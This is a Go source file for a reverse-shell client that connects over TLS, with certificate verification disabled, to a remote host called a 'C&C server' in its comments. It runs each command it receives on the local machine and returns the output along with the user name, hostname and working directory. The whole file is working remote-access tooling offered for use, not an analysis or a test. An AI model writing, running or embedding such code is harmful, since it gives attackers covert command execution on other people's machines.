package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	reverse "github.com/adedayo/reverse-shell/pkg"
)

var (
	config = tls.Config{
		InsecureSkipVerify: true, //You want to remove this to prevent MitM attacks
	}
	terminator = "\000" //use the 'null' byte to terminate strings to the C&C server
)

func main() {

	if len(os.Args) == 3 {
		server := os.Args[1]
		port := os.Args[2]
		conn, err := tls.Dial("tcp", net.JoinHostPort(server, port), &config)
		if err != nil {
			log.Fatalf("Client dial error: %s", err)
		}
		defer conn.Close()

		inbound := make(chan string)
		outbound := make(chan string)
		defer close(inbound)
		defer close(outbound)

		go runCommandProcessor(inbound, outbound)

		//Read commands from remote C&C server
		go func() {
			reader := bufio.NewReader(conn)
			for {
				if line, err := reader.ReadString('\n'); err == nil {
					line = strings.TrimSpace(line)
					if len(line) > 0 {
						inbound <- fmt.Sprintf("%s\n", line)
					}
				}
			}
		}()

		writer := bufio.NewWriter(conn)
		for {
			select {
			case out := <-outbound:
				writer.WriteString(out)
				writer.Flush()
			}
		}
	} else {
		fmt.Printf("Usage:\nclient-%s <remote-host> <remote-port>\n", runtime.GOOS)
	}
}

func getCurrentDir() (dir string) {
	if d, err := os.Getwd(); err == nil {
		dir = d
	}
	return
}

func getCurrentUser() (currentUser string) {
	if user, err := user.Current(); err == nil {
		currentUser = user.Username
	}
	return
}

func getHostname() (host string) {
	if h, err := os.Hostname(); err == nil {
		host = h
	}
	return
}

func executeCommand(command string) string {
	command = strings.TrimSuffix(command, "\n")
	args := strings.Split(command, " ")
	processBuiltInCommands(args)
	cmd := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	cmd.Run()
	return generateOutput(stdout.String(), stderr.String())
}

func runCommandProcessor(inbound <-chan string, outbound chan<- string) {
	outbound <- generateOutput("", "") // report current directory
	for {
		select {
		case in := <-inbound:
			outbound <- executeCommand(in)
		}
	}
}

func generateOutput(out, err string) string {
	output, _ := json.Marshal(reverse.ShellOut{
		User:     getCurrentUser(),
		Dir:      getCurrentDir(),
		Hostname: getHostname(),
		StdOut:   out,
		StdErr:   err,
	})
	return fmt.Sprintf("%s%s", string(output), terminator)
}

func processBuiltInCommands(args []string) {
	if len(args) == 0 {
		return
	}
	switch args[0] {
	case "cd":
		if len(args) == 1 {
			//switch to home directory ;-)
			if home, err := os.UserHomeDir(); err == nil {
				os.Chdir(home)
			}
		} else {
			os.Chdir(args[1])
		}
	}
}
